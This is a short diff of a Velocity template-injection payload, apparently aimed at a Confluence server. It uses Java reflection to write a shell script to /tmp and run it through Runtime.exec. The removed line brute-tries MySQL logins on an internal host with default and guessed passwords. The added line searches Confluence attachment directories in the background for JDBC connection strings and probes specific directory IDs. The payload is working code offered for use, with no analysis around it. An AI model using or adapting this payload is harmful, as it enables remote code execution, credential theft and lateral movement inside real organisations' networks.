@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===A===; mysql -h10.18.19.53 -P3307 -udb_manager -pdb_manager -e 'select 1' 2>&1 | head -3; echo ===B===; mysql -h10.18.19.53 -P3307 -uconfluence -pconfluence@2016 -e 'select 1' 2>&1 | head -3; echo ===C===; mysql -h10.18.19.53 -P3307 -uroot -proot -e 'select 1' 2>&1 | head -3")
+$w2.write("nohup sh -c 'find /u01/confluence-home/attachments/ver003 -type f -size -150k -exec grep -l jdbc:mysql {} + > /tmp/grep_jdbc.txt 2>/dev/null' >/dev/null 2>&1 & echo STARTED; echo ===SPRINGAUTH===; timeout 40 find /u01/confluence-home/attachments/ver003 -type d -name '24413311' 2>/dev/null | head -2; timeout 40 find /u01/confluence-home/attachments/ver003 -type d -name '16580682' 2>/dev/null | head -2")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
